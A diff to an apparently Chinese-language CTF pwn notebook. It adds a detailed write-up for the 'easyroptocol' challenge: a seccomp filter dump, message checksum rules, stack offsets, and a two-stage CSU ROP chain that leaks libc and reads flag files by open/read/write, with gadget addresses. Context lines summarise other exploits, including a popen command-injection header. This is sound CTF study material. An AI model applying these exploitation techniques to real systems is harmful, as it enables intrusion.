@@ -78,6 +78,7 @@
 | 21 | `pwnable_start` | ret2shellcode / 栈可执行 / 32 位静态汇编 | `ret2shellcode` | `read(0, esp, 0x3c)` 一次溢出即可覆盖返回地址，且 `push esp` 让栈地址天然泄漏；`GNU_STACK=RWE` 直接执行栈上 `execve("/bin/sh")` | **0x14**（shellcode 在 0x18） | `leak=0x8048087`、payload 基址 `leak-4`、shellcode 21 字节 |
 | 22 | `ropemporium_pivot` | stack pivot + 两阶段 .so leak / 64 位 | `stack_pivot` | `read(0, rbp-0x20, 0x40)` 只给 0x18 可用字节 → `pop rax`+`xchg rsp,rax` 迁到程序打印的 `heap+0xFFFF00`；CSU 链先调 `[foothold@got]` 触发懒绑定再 `puts` 泄漏 libpivot 基址，回 main 二次迁移打 `ret2win` | **0x28**（仅 0x40 上限） | `pop rax=0x4009bb`、`xchg rsp,rax=0x4009bd`、CSU `0x400a2a`/`0x400a10`、`foothold=0x96a`、`ret2win=0xa81` |
 | 23 | `pwnable_orw` | seccomp 沙箱 + ORW shellcode / 32 位 | `sandbox_seccomp` | `read(0, 0x804a060, 0xc8)` 后直接 `call` 缓冲区；BPF 只放行 `open/read/write/exit`，写 51 字节 ORW shellcode 读 `flag.txt` | N/A（无栈溢出） | shellcode 落点 `0x804a060`、上限 `0xc8`、BPF 表 `0x8048640` |
+| 24 | `easyroptocol` | seccomp 沙箱 + 4 槽 message 叠加溢出 / 64 位 | `sandbox_seccomp` | 选项 3 把 4 条 message 从 `+0x18` 起 `memcpy` 到 `rbp-0x3020`，每条只增长 `0xfe8`，第 4 次覆盖 saved RIP；BPF 只 KILL `execve`/x32；CSU `write` leak libc 后删 slot3 重建，用 `read` 把 open/exit 地址写进 bss，再 `open`×3 → `read(3)` → `write(1)` | **0x3028**（chain 在消息 4 的 `+0x88`） | `csu_pop=0x401baa`、`csu_call=0x401b90`、`ret=0x40101a`、`main=0x401a5e`、`write@got=0x404028`、`read@got=0x404040`、bss `0x404700` |
 | L1 | `lab_srop_baby`（自造） | SROP / 64 位静态汇编 | `srop` | `read(0, rsp, 0x400)` 溢出；只有 `syscall;ret` + `pop rax;ret`，无传参 gadget 无 libc → `rax=15` 触发 `rt_sigreturn`，sigframe 直接 `execve("/bin/sh")` | **0**（read 直接写 rsp） | `syscall;ret=0x401065`、`pop rax;ret=0x401068`、`bss=0x403010` |
 
 ---
@@ -697,6 +698,112 @@ xor eax,eax; xor ebx,ebx; inc ebx; mov al,4; int 0x80      ; write(1,...)
 
 ---
 
+### 3.24 `24_easyroptocol` → `sandbox_seccomp`
+
+```text
+64 位 amd64、No PIE（EXEC）、NX、Partial RELRO、无 canary、stripped、14968 B
+附件自带 libc-2.31.so
+```
+
+`init@0x401296`：
+
+```text
+prctl(38, 1, 0, 0, 0)                 # PR_SET_NO_NEW_PRIVS
+prctl(22, 2, &sock_fprog)             # SECCOMP_MODE_FILTER，sock_fprog 在栈上
+```
+
+BPF 不是 `.rodata` 数组，而是 16 条 `mov` 立即数直接铺在 `rbp-0x40..rbp-0x8`
+（每条 `{u16 code; u8 jt; u8 jf; u32 k;}`）：
+
+```text
+idx  code  jt jf  k           动作
+ 0   0x20   0  0  4           ld [4]                 ; arch
+ 1   0x15   0  5  0xc000003e  jeq x86_64 ? idx2 : KILL
+ 2   0x20   0  0  0           ld [0]                 ; nr
+ 3   0x35   0  1  0x40000000  jge 0x40000000 ? idx4 : idx5
+ 4   0x15   0  2  0xffffffff  jeq -1 ? idx5 : KILL ; x32 几乎全杀
+ 5   0x15   1  0  59          jeq execve ? KILL : ALLOW
+ 6   0x06   0  0  0x7fff0000  ret ALLOW
+ 7   0x06   0  0  0           ret KILL
+```
+
+结论：`execve`(59) 被 KILL，`open`(2)/`read`(0)/`write`(1)/`exit_group`(231)
+都落在 ALLOW。`system("/bin/sh")` 走不通，只能 ORW。
+
+判定依据：
+
+1. 两次 `prctl` + 栈上的 8 条 BPF → 命中 §1 判定顺序第 0 条 `sandbox_seccomp`。
+2. 选项 3 `@0x401830` 的 `memcpy` 循环把多条 message 叠加进 `rbp-0x3020`，
+   是可控的栈溢出原语；二进制无 canary，No PIE 可直接用 `0x401xxx` gadget。
+
+栈布局（实测）：
+
+```text
+buf = rbp-0x3020
+for seq in 1 / 0x1001 / 0x2001 / 0x3001:
+    memcpy(buf + strlen(buf), slot + 0x18, 0x1000)
+dest = 0 / 0xfe8 / 0x1fd0 / 0x2fb8
+saved RIP = buf+0x3028  ->  第 4 条 message 的 +0x88
+```
+
+**为什么每条只增长 0xfe8**：`malloc(0x1000)` 的 chunk 实际 `0x1010`，`read` 最多写到
+`slot+0xfff`；`memcpy` 读到 `slot+0x1017` 时，`slot+0x1000..+0x1007` 是下一个 chunk 的
+`prev_size`（分配状态下为 0），所以源数据在第 `0xfe8` 字节先遇到 NUL。
+3 条累计 `0x2fb8 < 0x3028`，够不到返回地址；必须 4 条。
+
+message 校验（`check1@0x4014af` + `check2@0x401590`）：
+
+| 偏移 | 条件 |
+| --- | --- |
+| `+0x00` | `== 0x766e`（`"nv"`） |
+| `+0x02` | `== 0x28b7` |
+| `+0x04` | `!= 0`，提交时需等于期望序号（`1/0x1001/0x2001/0x3001`） |
+| `+0x08` | `!= 0` |
+| `+0x0c` | `(u16 & 0xf)*4 == 0x18`（填 6 走 memcpy） |
+| `+0x0e` | `!= 0` |
+| `+0x10` | `== checksum`（0x800 个 LE u16 全异或，跳过 word[8]，再异或 `b"fakeipheadfa"` 的 6 个 LE u16） |
+| `+0x12` | `== 0` |
+| `+0x14` | `!= 0` |
+| `+0x16` | `== 0xffff` |
+| `+0x18` | payload |
+
+两阶段链（全 `__libc_csu_init`，不依赖 `pop rdx;ret`）：
+
+```text
+stage1: csu(write@got, 1, write@got, 8) + ret + main(0x401a5e)
+        # 泄漏 libc；ret 是栈对齐垫片（rbp%16==0，直接 ret 到 main 会在 movaps 崩）
+
+stage2: 选项 2 删 slot3（chunk4 与 top 相邻，free 后并进 top）
+        选项 1 重新 malloc(0x1000)，切回同一地址（尾部 prev_size 仍为 0）
+        选项 3 执行：
+          read(0, 0x404700, 0x40)      # open/exit 指针 + "/flag" / "flag" / "flag.txt"
+          open(0x404718,0,0); open(0x404720,0,0); open(0x404728,0,0)
+          read(3, 0x404800, 0x100)
+          write(1, 0x404800, 0x100)
+          exit(0)                      # 通过 [0x404710] 调用
+```
+
+关键设计：open/exit 的绝对地址不写死，由 stage2 链里的 `read` 动态写入 bss，
+因此同一份 exp 本地（系统 libc）和远端（附件 2.31）通用。
+
+坑点：
+
+1. 菜单是 `read(0, buf, 8)` + `atoi`，必须一次写满 8 字节（`b"1\n"+b"\x00"*6`）。
+2. 选项 3 的 `i/counter` 位于 `buf+0x3008/0x300c`，回显 `strlen` 只有 0x3009，
+   不能用回显长度反推 chain 位置。
+3. 只能删 slot3 再重建；删前 3 条会把下一个 chunk 的 `prev_size` 写成非 0，
+   增长变成 0x1000，chain 落点偏 0x48。
+4. 重入 main 会再装一次 seccomp：`no_new_privs` 已置 1，重复安装合法，slot 表不清空。
+
+实测（本地连续 5 次成功，`exit code 0`）：
+
+```text
+[+] write@libc = 0x757396128bd0, libc base = 0x757396000000
+[+] flag: __PWNED__{easyroptocol_local_ok}
+```
+
+---
+
 ### 3.L1 `lab_srop_baby` → `srop`（自造实验）
 
 ```text
@@ -776,6 +883,7 @@ ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
 | pwnable.tw `start`（外部下载，`_vendor/start`） | `ret2shellcode/21_pwnable_start_*`、`ret2shellcode/pwnable_start` |
 | ROP Emporium `pivot`（外部下载，`_vendor/pivot/`） | `stack_pivot/22_ropemporium_pivot_*`、`stack_pivot/pivot`、`stack_pivot/libpivot.so` |
 | pwnable.tw `orw`（外部下载，`_vendor/orw`） | `sandbox_seccomp/23_pwnable_orw_*`、`sandbox_seccomp/orw`、`sandbox_seccomp/make_local_exec.py` |
+| V&N 2022 校赛 `easyROPtocol`（附件目录 `easyROPtocol/`） | `sandbox_seccomp/24_easyroptocol_*`、`sandbox_seccomp/easyroptocol`、`sandbox_seccomp/libc-2.31.so` |
 | 自造实验（无外部来源） | `labs/lab_srop_baby/`（`src/chal.S` + `Makefile` + `exp.py` + `README.md`） |
 
 命名规则：
@@ -795,7 +903,7 @@ ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
 ## 5. 待解登记（pending）
 
 以下二进制仍留在仓库根目录，尚未归档到模式目录，避免“强行套模板”造成错误结论。
-两份分析已做到“定性 + 阻塞点明确”，后续可以直接接着做。
+每节都做到“定性 + 阻塞点明确”，后续可以直接接着做。
 
 ### 5.1 `rec_33c3_2016`（33C3 CTF 2016 / 32 位计算器）
 
@@ -854,34 +962,7 @@ args 1..264 中不存在 0x804a0a0（flag），也不存在 0x804a010（strcmp@G
 3. 用 `%n` 把 `strchr@GOT` 改成 `main`（`0x804872b` ≈ 134M 字符，可接受），
    让程序跑第二轮 —— 第二轮 `strcmp` / `puts` 已解析，才有机会拿到 `0x804a010` 槽位。
 
-### 5.3 `easyROPtocol/pwn`（2022 校赛 / seccomp + 4 槽 message）
-
-```text
-64 位、No PIE（EXEC）、NX、Partial RELRO、无 canary、stripped；附件 libc-2.31.so
-init 里做了 seccomp：prctl(0x26=PR_SET_NO_NEW_PRIVS,1,0,0,0)
-                 + prctl(0x16=PR_SET_SECCOMP,2,&sock_fprog)（8 条 BPF，先按“无强限制”待确认）
-
-菜单（父函数 0x401a5e）：1. Your tcp message  2. Delete the message  3. Submit  4. Quit
-4 个消息槽：全局表 0x404240（每槽 8 字节指针，共 4 个）
-选项 1 @0x4016xx：malloc(0x1000) + read(0, chunk, 0x1000)，随后校验（"nv"=0x766e、0x28b7、
-                 dword@+0x4 与槽号匹配），不通过就 free
-选项 3 @0x401830：栈帧 0x3018，buf = rbp-0x3020
-   strcpy(rbp-0x3020, chunk + 4*(word@+0xc & 0xf))     <-- 无界 strcpy
-   然后对每个槽 memcpy(rbp-0x3020 + strlen(buf), chunk, 0x1000) 循环（+0x1000/次）
-   最后 write(1, buf, strlen(buf)) + write(1, "Done.\n") 才 ret
-```
-
-阻塞点：单条 message 最多 0x1000 字节，而栈缓冲是 0x3020，必须凑满多个槽（每个都要通过
-`"nv"`/`0x28b7`/槽号校验）让 `memcpy` 把总长度顶过 0x3020；且 seccomp 允许的 syscall 集合
-还没静态确认，决定最终是 `system("/bin/sh")` 还是 ORW。
-
-下一步：
-
-1. 用 `gdb` 在 0x401a38 前 dump seccomp 过滤器的 8 条 BPF（`sock_fprog.filter`），确认是否只放行 `read/write`。
-2. 用 2~4 个合法 message 把 `memcpy` 的累计偏移顶到 `0x3020+8`，测 saved rip 的位置。
-3. 若 seccomp 只放行 `read/write` → `open/read/write` 的 ORW ROP；否则直接 `system("/bin/sh")`。
-
-### 5.4 `PWN附件/canary3`（PIE + 字符串加密）
+### 5.3 `PWN附件/canary3`（PIE + 字符串加密）
 
 ```text
 64 位、PIE、NX、Partial RELRO、Canary、not stripped（无符号表）
@@ -901,7 +982,7 @@ strings 全为空/乱码（运行时解密）；导入里有 system@plt
 2. 断在 `0x2351` 的两处 `strcmp`，看比较的是输入 vs 全局字符串还是输入 vs 输入。
 3. 若 `system` 的参数可控（例如 `system(buf)` 且 buf 可写），走 `ret2text`；否则先 leak PIE/Canary。
 
-### 5.5 `jarvisoj_http`（端口 1807 的 httpd，`popen` 命令注入）
+### 5.4 `jarvisoj_http`（端口 1807 的 httpd，`popen` 命令注入）
 
 ```text
 64 位、No PIE、NX；监听 0,0,0,0:1807（htons(0x70f)），accept 后 fork
@@ -934,11 +1015,11 @@ handler      @0x40116c：
 3. 拿到 agent 后：请求头顺序 `User-Agent: <8字节>`（二进制，无空白）+ `back: cat flag*`，
    直接在回包 body 取 flag。
 
-### 5.6 其他高难题（仅登记，未展开）
+### 5.5 其他高难题（仅登记，未展开）
 
 | 二进制 | 保护 / 形态 | 已知信息 | 判定 |
 | --- | --- | --- | --- |
 | `publibc/bf` | PIE、Full RELRO、Canary；导入 `system` | 14KB，`scanf`/`getchar`/`putchar`/`malloc` + `system` —— 典型 brainfuck 解释器，越界指针对 tape 任意读写；Full RELRO 不能改 GOT | 需 hook / FSOP，30 分钟以上 |
 | `card/pwn` | PIE、Full RELRO、Canary；附件 `libc.so` | 10KB，`printf`/`__isoc99_scanf`/`malloc`/`free`/`read`/`write` —— 疑似“卡牌”堆题 | 需 PIE + heap leak，30 分钟以上 |
 
-> 以上 5.3–5.6 均按“20 分钟规则”降级：先保证已解题目归档完整，再回头做。
+> 以上 5.1–5.5 均按“20 分钟规则”降级：先保证已解题目归档完整，再回头做。
